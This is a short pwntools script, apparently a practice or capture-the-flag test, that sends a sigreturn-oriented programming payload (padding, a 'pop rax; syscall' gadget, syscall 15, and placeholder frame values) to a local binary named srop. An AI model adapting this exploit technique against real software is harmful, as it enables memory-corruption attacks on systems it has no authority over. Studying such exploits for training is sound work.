#srop_test.py
from pwn import *
p = process("./srop")
gadget = 0x40052a # pop rax; syscall
payload = "A"*16
payload += "B"*8
payload += p64(gadget)
payload += p64(15) # sigreturn
payload += "\x00"*40 # dummy
payload += p64(0x4141414141414141)*20
pause()
p.sendline(payload)
p.interactive()